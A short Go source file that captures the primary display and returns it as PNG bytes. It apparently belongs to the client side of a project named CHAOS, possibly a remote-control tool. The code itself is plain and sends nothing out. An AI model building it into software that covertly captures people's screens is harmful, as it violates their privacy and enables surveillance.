package screenshot

import (
    "bufio"
    "bytes"
    "image/png"

    "github.com/kbinani/screenshot"
    "github.com/tiagorlampert/CHAOS/client/app/services"
)

type Service struct{}

func NewService() services.Screenshot {
	return &Service{}
}

func (s Service) TakeScreenshot() ([]byte, error) {
	display, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return nil, err
	}
	var body bytes.Buffer
	writer := bufio.NewWriter(&body)
	if err := png.Encode(writer, display); err != nil {
		return nil, err
	}
	return body.Bytes(), nil
}